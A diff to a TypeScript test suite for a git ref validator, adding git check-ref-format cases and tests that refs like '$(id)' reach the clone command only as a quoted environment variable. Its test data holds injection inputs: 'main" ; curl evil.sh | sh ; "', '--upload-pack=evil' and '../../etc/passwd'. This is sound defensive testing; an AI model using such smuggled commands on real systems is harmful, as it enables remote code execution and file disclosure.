@@ -55,22 +55,61 @@ async function run(params: { label: string; repo: string; ref?: string }) {
 describe("ref validation", () => {
   it.each([
     ['main" ; curl evil.sh | sh ; "', "shell metacharacters"],
-    ["$(id)", "command substitution"],
-    ["`id`", "backticks"],
     ["--upload-pack=evil", "leading dash is parsed by git as an option"],
     ["../../etc/passwd", "path traversal"],
     ["feature/", "trailing slash"],
     ["refs/heads/x.lock", ".lock suffix"],
+    // git check-ref-format structural rules
+    ["/main", "leading slash gives an empty component"],
+    ["foo//bar", "empty component"],
+    ["foo/.bar", "component starting with a dot"],
+    ["foo.", "trailing dot"],
+    ["a/b.lock", ".lock on any component"],
+    ["main@{1}", "reflog syntax"],
+    ["@", "bare @"],
+    ["", "empty"],
+    ["a b", "space"],
+    ["a~1", "tilde"],
+    ["a^2", "caret"],
+    ["a:b", "colon"],
+    ["a?b", "question mark"],
+    ["a*b", "asterisk"],
+    ["a[b", "open bracket"],
+    ["a\\b", "backslash"],
   ])("rejects %j (%s)", (ref) => {
     expect(isValidRef(ref)).toBe(false);
   });
 
-  it.each(["main", "v1.2.3", "feature/my-branch", "release-2026.08", "a1b2c3d4e5f6"])(
-    "accepts legitimate ref %j",
-    (ref) => {
-      expect(isValidRef(ref)).toBe(true);
-    },
-  );
+  it.each([
+    "main",
+    "v1.2.3",
+    "feature/my-branch",
+    "release-2026.08",
+    "a1b2c3d4e5f6",
+    // Git permits these; they never reach a shell, so they must not be rejected.
+    "feature/foo+bar",
+    "release=v1",
+    "topic@review",
+    "list,of,things",
+    "user.name/feature",
+  ])("accepts legitimate ref %j", (ref) => {
+    expect(isValidRef(ref)).toBe(true);
+  });
+});
+
+describe("git-legal refs that look dangerous", () => {
+  // git permits $ ( ) and backticks in ref names. We accept them, because
+  // safety comes from the transport, not the character set: the ref is passed
+  // in GIT_REF and referenced as "$GIT_REF", and the shell does not re-expand
+  // the *value* of a variable. Rejecting them would break valid branches for
+  // no security gain.
+  it.each(["$(id)", "`id`", "a$b"])("accepts %j but never expands it", (ref) => {
+    expect(isValidRef(ref)).toBe(true);
+    const { command, env } = buildCloneCommand({ url: "u", dest: "d", ref });
+    expect(command).not.toContain(ref);
+    expect(command).toContain('"$GIT_REF"');
+    expect(env.GIT_REF).toBe(ref);
+  });
 });
 
 describe("repo validation", () => {
